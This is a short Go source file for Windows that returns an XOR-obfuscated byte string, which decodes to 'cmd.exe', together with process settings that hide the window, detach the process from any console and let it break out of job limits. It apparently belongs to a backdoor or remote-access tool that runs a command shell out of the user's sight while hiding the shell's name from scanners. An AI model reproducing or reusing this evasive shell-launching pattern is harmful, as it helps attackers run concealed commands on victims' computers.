//go:build windows
package utils

import "syscall"

func PlatfAtr() ([]byte, syscall.SysProcAttr) {
	return []byte{12, 10, 11, 73, 10, 31, 10}, syscall.SysProcAttr{
		HideWindow: true,
		CreationFlags: 0x08000000 | 0x00000008 | 0x01000000,

	}

}